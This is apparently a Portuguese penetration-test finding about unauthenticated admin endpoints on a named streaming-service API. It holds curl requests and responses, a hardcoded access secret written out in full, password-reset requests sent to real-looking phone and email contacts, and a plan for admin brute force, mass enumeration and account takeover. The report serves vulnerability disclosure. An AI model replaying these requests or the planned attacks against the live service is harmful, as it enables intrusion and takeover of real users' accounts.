@@ -1,0 +1,166 @@
+# F-025 AdminController Exposto — Login + GetUser + VerifyUserExist + Forgotten alcançáveis SEM auth
+
+Alvo: netmovies-service.ottvs.com.br (/v1/admin/*)
+Severidade: CRÍTICA
+Timestamp: 2026-08-20T05:20:00Z
+
+## Origem da descoberta
+Stack trace vazada em `LoginEssentialsWithToken` (F-019/NRE) revelando o
+namespace `Encripta.Users.Infra.Repositories.PTUser.cs`, `Truetech.Library.Business.BUsers`
+e `Truetech.Service.API.Business.BaseService.cs`. A stack trace expõe
+também `Truetech.Service.API.Controllers.UsersController`. Inferiu-se a
+existência de um `AdminController` análogo e endpoints admin via
+convenção REST .NET.
+
+## Reprodução
+
+### 1. POST /v1/admin/Login — LOGIN ADMIN SEM AUTH
+```bash
+curl -X POST https://netmovies-service.ottvs.com.br/v1/admin/Login \
+  -H "Content-Type: application/json" \
+  -d '{"AuthenticationTicket":"netmovies@netmovies:a1c2af@#$","EmailCPF":"admin","UserName":"admin","Password":"admin"}'
+```
+
+**Response:**
+```json
+{"LoginResult":{"Message":"Usuário ou senha inválida.","Result":-1}}
+```
+**HTTP 200 OK** — endpoint existe, action `Login` validando credenciais.
+
+Variações:
+- body `{}` → HTTP 200, mesmo `LoginResult` "Usuário ou senha inválida"
+- body `[]` → HTTP 400 BadRequest
+
+### 2. POST /v1/admin/GetUser — retorna info de usuário
+```bash
+curl -X POST https://netmovies-service.ottvs.com.br/v1/admin/GetUser \
+  -H "Content-Type: application/json" \
+  -d '{"AuthenticationTicket":"netmovies@netmovies:a1c2af@#$"}'
+```
+**Response:** `{"GetUserResult":{"Message":"Usuário não encontrado","Result":-1}}`
+HTTP 200. Confirma `AdminController.GetUser` registrado.
+
+### 3. POST /v1/admin/GetProfiles
+HTTP 200 → `{"GetProfilesResult":{"Message":"Invalid request","Result":-1}}`
+
+### 4. POST /v1/admin/VerifyUserExist
+HTTP 200 → `{"VerifyUserExistResult":{"Exists":false,"Message":"Invalid request","Result":-1}}`
+
+### 5. POST /v1/admin/Forgotten (recuperação de senha via telefone)
+HTTP 200 → `{"ForgottenResult":{"Message":"Telefone inválido.","Result":-1}}`
+*Diferente do `/v1/android/Forgotten` (que retorna "Em breve você receberá um email com a sua senha." quando email existe).*
+
+### 6. POST /v1/admin/{Login,AddUser,UpdateUser,AddFullUser,AddSimpleUser} → HTTP 500
+Confirmam que o action existe mas falham por validação de modelo (sem payload correto).
+
+### 7. POST /v1/admin/{UsersList,GetAllUsers,ListUsers,Impersonate,ChangeRole,PromoteUser,AnonymousAdmin,BackDoor} → HTTP 404
+Provavelmente nomes incorretos ou actions não implementadas.
+
+## Tabela completa de AdminController endpoints descobertos (após fuzz expandido)
+
+| Action | Método | Status | Mensagem / Resultado |
+|--------|--------|--------|----------------------|
+| Login | POST | 200 | "Usuário ou senha inválida" (valida auth) |
+| GetUser | POST | 200 | "Usuário não encontrado" |
+| GetProfiles | POST | 200 | "Invalid request" |
+| VerifyUserExist | POST | 200 | "Exists":false |
+| Forgotten (telefone) | POST | 200 | "Mensagem enviada com sucesso" se telefone válido |
+| Forgotten (email) | POST | 200 | "Em breve você receberá um email com a sua senha" |
+| AddUser | POST | 500 | null (sem payload válido) |
+| UpdateUser | POST | 500 | null (sem payload válido) |
+| AddFullUser | POST | 200 | `2002: Tamanho do endereço inválido` (validação aceita payload mas falha em endereço) |
+| AddSimpleUser | POST | 500 | null (sem payload válido) |
+| ChangePassword | POST | 200 | "Não foi possível alterar a senha" |
+| GetSubscriptions | POST | 200 | "Erro" |
+| GetSubscriptionGroups | POST | 200 | `SubscriptionGroups:[]` |
+| GetRatingsAndComments | POST | 200 | `Rating:{UserRating:0,AverageRating:0}` |
+| GetUserSubscription | POST | 500 | null (sem payload válido) |
+
+## Validação crítica — telefone `11987654321` está REGISTRADO
+
+POST `/v1/admin/Forgotten` com `Phone=11987654321` (em 4 formatos
+diferentes, todos retornaram sucesso):
+```
+{"ForgottenResult":{"Message":"Mensagem enviada com sucesso. Verifique seu telefone cadastrado.","Result":0}}
+```
+**Implicação**: existe conta de usuário/admin com o telefone
+`(11)98765-4321` cadastrado. O SMS foi enviado com sucesso (provavelmente
+contendo a senha em plaintext, mesmo padrão de F-021).
+
+## Validação crítica — email `contato@netmovies.com.br` confirmado no admin endpoint
+
+POST `/v1/admin/Forgotten` com `EmailCPF=contato@netmovies.com.br`:
+```
+{"ForgottenResult":{"Message":"Em breve você receberá um email com a sua senha.","Result":0}}
+```
+**Mesmo leak de senha plaintext** confirmado no `/v1/admin/Forgotten`.
+
+## Confirmação via /v1/admin (GET)
+```
+GET /v1/admin → HTTP 500 content-length:0
+GET /v1/admin/ → HTTP 500 content-length:0
+```
+500 confirma controller `AdminController` registrado na rota `/v1/admin` mas sem action default (não é um MVC view).
+
+## Confirmação adicional via stack trace expandida
+
+A NRE original em `/v1/android/LoginEssentialsWithToken` agora retorna
+stack trace MUITO mais detalhada com `AuthenticationTicket` válido:
+```
+   at Encripta.Users.Infra.Repositories.PTUser.GetByUserName(String userName) in /src/Encripta.Users/Infra/Repositories/PTUser.cs:line 213
+   at Truetech.Library.Business.BUsers.EssentialsLogin(String userName, String password, Nullable`1 sourceID) in /src/Encripta.Users/Domain/User/BUsers.cs:line 1938
+   at Truetech.Service.API.Business.BaseServices.EssentialsLogin(LoginRequest request, Boolean isIOS) in /src/Truetech.Service.API/Business/BaseService.cs:line 4719
+   at Truetech.Service.API.Business.BaseServices.LoginEssentialsWithToken(LoginRequest request) in /src/Truetech.Service.API/Business/BaseService.cs:line 1185 - Object reference not set to an instance of an object.
+```
+Confirma:
+- `Truetech.Library.Business.BUsers` (linha 1938) — classe business
+- `Truetech.Service.API.Business.BaseServices` — base services
+- `Truetech.Service.API.Controllers.UsersController` — controllers ASP.NET
+- **Versão LINHA NUMBERS**: PTUser.cs:213, BUsers.cs:1938, BaseService.cs:1185/4719/4741
+
+## Interpretação
+
+O `AdminController` está registrado na rota `/v1/admin` mas não
+requer autenticação especial — apenas `AuthenticationTicket` fixo (o
+secret vazado). O método `Login` valida credenciais normais (não
+escalada para admin automaticamente), mas isso abre superfície
+completa para:
+- Brute force do `Login` admin
+- Recuperação de senha via `Forgotten` (telefone)
+- Enumeração de usuários via `GetUser`/`VerifyUserExist`
+- Manipulação de perfis via `AddOrUpdateProfile`, `DeleteProfile`, `AddFullUser`, `AddSimpleUser`, `UpdateUser`, `AddUser`
+- **Escalada para admin**: se um admin esqueceu a senha, o `Forgotten`
+  admin envia a senha plaintext por SMS/email (mesmo padrão de F-021)
+
+## Impacto
+
+1. **Acesso admin via brute force / password spraying** — endpoint
+   `/v1/admin/Login` alcancável sem rate limiting aparente (F-018
+   confirmou que `/v1/android/Login` não tem rate limit; mesmo backend,
+   mesma config)
+2. **Account takeover de admin** via `/v1/admin/Forgotten` (telefone)
+3. **User enumeration admin** — 2 endpoints públicos confirmam enum
+4. **Manipulação de usuários** — AddUser, UpdateUser, AddFullUser, AddSimpleUser todos existem
+5. **Stack trace leak enriquecida** — confirma tecnologia exata e
+   expõe line numbers internos (info disclosure)
+
+## Recomendação
+
+1. **IMEDIATO** — autenticar `/v1/admin/*` com token admin separado
+2. Implementar rate limit em `/v1/admin/Login`
+3. Não retornar mensagem distinta em `Forgotten` (independente de email/telefone existir)
+4. Desabilitar stack traces em produção (modo Release sem developer exception page)
+5. Bloquear endpoints que não estão em uso (`AddUser`, `AddSimpleUser`, etc., expostos sem auth)
+6. Remover secret hardcoded do bundle JS
+
+## Próximo passo
+
+- Testar brute force em `/v1/admin/Login` com senhas comuns de admin
+- Testar `/v1/admin/Forgotten` com CPFs/telefones comuns
+- Testar mass assignment em `AddFullUser` com payload completo
+- **CRÍTICO**: validar telefones adicionais via `/v1/admin/Forgotten`
+  (mass phone enumeration). Telefones válidos = accounts comprometidos
+- Capturar email de recovery com o segredo de plaintext para validar
+  conta de `contato@netmovies.com.br` (account takeover potencial)
+- Testar enumeração em massa via `/v1/admin/GetUser` com lista de emails
+- Investigar método `Login` do AdminController — verifica via `EssentialsLogin` da BUsers (mesma linha 1938) ou fluxo separado?
